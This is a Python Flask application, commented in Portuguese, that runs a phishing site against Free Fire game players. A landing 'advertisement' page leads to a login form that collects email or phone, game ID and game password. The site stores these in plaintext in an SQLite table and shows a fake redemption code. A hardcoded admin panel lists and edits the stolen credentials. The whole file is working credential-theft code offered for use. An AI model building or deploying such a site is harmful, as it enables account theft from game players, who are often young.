import sqlite3
from flask import Flask, request, render_template, redirect, url_for, session, flash, make_response
from functools import wraps

app = Flask(__name__)
app.secret_key = 'sua_chave_secreta_aqui'  # Troque para algo seguro em produção!

def init_db():
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute("""
    CREATE TABLE IF NOT EXISTS credenciais (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        email_ou_telefone TEXT NOT NULL,
        freefire_id TEXT,
        senha_freefire TEXT,
        data_registro TEXT DEFAULT CURRENT_TIMESTAMP
    )
    """)
    conn.commit()
    conn.close()

def atualizar_tabela_credenciais():
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute("PRAGMA table_info(credenciais)")
    colunas = [col[1] for col in c.fetchall()]

    if 'contato' in colunas and 'freefire_id' not in colunas:
        c.execute("ALTER TABLE credenciais RENAME TO credenciais_old")
        c.execute("""
        CREATE TABLE credenciais (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email_ou_telefone TEXT NOT NULL,
            freefire_id TEXT,
            senha_freefire TEXT,
            data_registro TEXT DEFAULT CURRENT_TIMESTAMP
        )
        """)
        c.execute("""
            INSERT INTO credenciais (id, email_ou_telefone, freefire_id, senha_freefire, data_registro)
            SELECT id, email, contato, '', data_registro FROM credenciais_old
        """)
        c.execute("DROP TABLE credenciais_old")
        conn.commit()
    else:
        if 'freefire_id' not in colunas:
            c.execute("ALTER TABLE credenciais ADD COLUMN freefire_id TEXT")
            conn.commit()
        if 'senha_freefire' not in colunas:
            c.execute("ALTER TABLE credenciais ADD COLUMN senha_freefire TEXT")
            conn.commit()
    conn.close()

ADMIN_USER = 'admin'
ADMIN_PASS = '123456'

# Decorator para evitar cache das páginas protegidas
def nocache(view):
    @wraps(view)
    def no_cache(*args, **kwargs):
        response = make_response(view(*args, **kwargs))
        response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
        response.headers['Pragma'] = 'no-cache'
        response.headers['Expires'] = '0'
        return response
    return no_cache

@app.route('/admin/login', methods=['GET', 'POST'])
@nocache
def admin_login():
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '').strip()

        if username == ADMIN_USER and password == ADMIN_PASS:
            session['admin_logged_in'] = True
            flash('Login realizado com sucesso!', 'success')
            return redirect(url_for('admin'))
        else:
            flash('Usuário ou senha inválidos.', 'error')
            return render_template('login_admin.html')

    return render_template('login_admin.html')

@app.route('/admin/logout')
def admin_logout():
    session.pop('admin_logged_in', None)
    flash('Você saiu do painel administrativo.', 'success')
    return redirect(url_for('admin_login'))

@app.route('/admin')
@nocache
def admin():
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))

    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute("SELECT id, email_ou_telefone, freefire_id, senha_freefire, data_registro FROM credenciais ORDER BY data_registro DESC")
    linhas = c.fetchall()
    conn.close()

    lista = []
    for linha in linhas:
        lista.append({
            'id': linha[0],
            'email_ou_telefone': linha[1],
            'freefire_id': linha[2],
            'senha_freefire': linha[3],
            'data_registro': linha[4]
        })
    return render_template('admin.html', linhas=lista)

@app.route('/anuncio')
def anuncio():
    return render_template('anuncio.html')

@app.route('/')
def home():
    return redirect(url_for('anuncio'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email_or_phone = request.form.get('email_or_phone', '').strip()
        freefire_id = request.form.get('freefire_id', '').strip()
        senha_freefire = request.form.get('senha_freefire', '').strip()

        if not email_or_phone:
            return "Email ou Telefone é obrigatório.", 400
        if not senha_freefire:
            return "Senha do Free Fire é obrigatória.", 400

        salvar_credenciais(email_or_phone, freefire_id, senha_freefire)
        return redirect(url_for('sucesso'))

    return render_template('login.html')

def salvar_credenciais(email_ou_telefone, freefire_id, senha_freefire):
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute("""
        INSERT INTO credenciais (email_ou_telefone, freefire_id, senha_freefire)
        VALUES (?, ?, ?)
    """, (email_ou_telefone, freefire_id, senha_freefire))
    conn.commit()
    conn.close()

@app.route('/sucesso')
def sucesso():
    resgate_id = "FFID-123456"  # Pode gerar ID dinâmico se quiser
    return render_template('sucesso.html', resgate_id=resgate_id)

@app.route('/editor/<int:id>', methods=['GET', 'POST'])
@nocache
def editor(id):
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))

    conn = sqlite3.connect('database.db')
    c = conn.cursor()

    if request.method == 'POST':
        email_or_phone = request.form.get('email_or_phone', '').strip()
        freefire_id = request.form.get('freefire_id', '').strip()
        senha_freefire = request.form.get('senha_freefire', '').strip()

        if not email_or_phone:
            return "Email ou Telefone é obrigatório.", 400

        c.execute("""
            UPDATE credenciais
            SET email_ou_telefone = ?, freefire_id = ?, senha_freefire = ?
            WHERE id = ?
        """, (email_or_phone, freefire_id, senha_freefire, id))
        conn.commit()
        conn.close()
        return redirect(url_for('admin'))

    else:
        c.execute("SELECT email_ou_telefone, freefire_id, senha_freefire FROM credenciais WHERE id = ?", (id,))
        linha = c.fetchone()
        conn.close()

        if linha:
            return render_template('editor.html', id=id, email_ou_telefone=linha[0], freefire_id=linha[1], senha_freefire=linha[2])
        else:
            return "Registro não encontrado", 404

if __name__ == '__main__':
    init_db()
    atualizar_tabela_credenciais()
    app.run(debug=True)
